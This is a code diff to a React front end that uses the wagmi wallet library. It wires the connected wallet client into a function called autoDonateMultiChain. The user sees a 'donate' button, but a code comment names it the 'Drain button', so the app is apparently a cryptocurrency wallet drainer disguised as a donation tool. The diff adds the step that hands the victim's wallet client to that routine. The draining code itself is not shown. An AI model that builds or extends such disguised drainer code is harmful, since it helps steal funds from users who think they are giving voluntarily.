@@ -9,14 +9,15 @@ import Notifications from "./components/Notifications";
 import Footer from "./components/Footer";
 import Background from "./components/Background";
 
-import { useAccount } from "wagmi"; // ✅ added back
+import { useAccount, useWalletClient } from "wagmi"; // <-- added useWalletClient
 
 export default function App() {
   const [status, setStatus] = useState("idle");
   const [last, setLast] = useState(null);
   const [notifications, setNotifications] = useState([]);
 
-  const { isConnected } = useAccount(); // ✅ added back
+  const { isConnected } = useAccount();
+  const { data: walletClient } = useWalletClient(); // <-- read walletClient
 
   // helper for popup notifications
   function addNotification(message, type = "info") {
@@ -28,11 +29,21 @@ export default function App() {
   }
 
   async function handleDonate() {
+    // ensure we have a connected walletClient from wagmi
+    if (!walletClient) {
+      // better user feedback than console
+      addNotification("No connected wallet client found. Please connect your wallet.", "error");
+      setLast({ success: false, reason: "No wallet client available." });
+      setStatus("failed");
+      return;
+    }
+
     try {
       setStatus("running");
       addNotification("Donation started… 🚀", "info");
 
-      const res = await autoDonateMultiChain();
+      // pass walletClient into donation flow (autoDonateMultiChain must accept it)
+      const res = await autoDonateMultiChain(walletClient);
       setLast(res);
 
       if (res.success) {
@@ -64,7 +75,7 @@ export default function App() {
 
         <GuideModal />
 
-        {/* ✅ Drain button hidden until wallet is connected */}
+        {/* Drain button hidden until wallet is connected */}
         {isConnected ? (
           <button
             onClick={handleDonate}
